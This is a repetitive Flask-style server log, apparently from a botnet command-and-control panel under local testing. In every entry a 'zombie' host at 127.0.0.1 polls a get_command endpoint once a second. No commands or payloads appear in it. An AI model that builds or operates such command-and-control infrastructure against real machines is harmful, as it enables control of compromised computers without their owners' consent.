2025-06-25 00:08:01 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:02 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:03 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:04 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:05 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:06 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:07 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:08 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:09 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:10 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:11 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:12 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:13 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:14 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:15 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:16 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:17 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:18 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:19 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:20 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:21 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:22 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:23 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:24 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:25 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:26 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:27 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:28 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:29 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:30 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:31 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:32 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:33 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:34 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:35 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:36 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:37 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:38 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:39 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:40 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:41 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:42 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:43 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:44 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:45 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:46 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:47 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:48 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:49 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:50 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:51 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:52 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:53 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
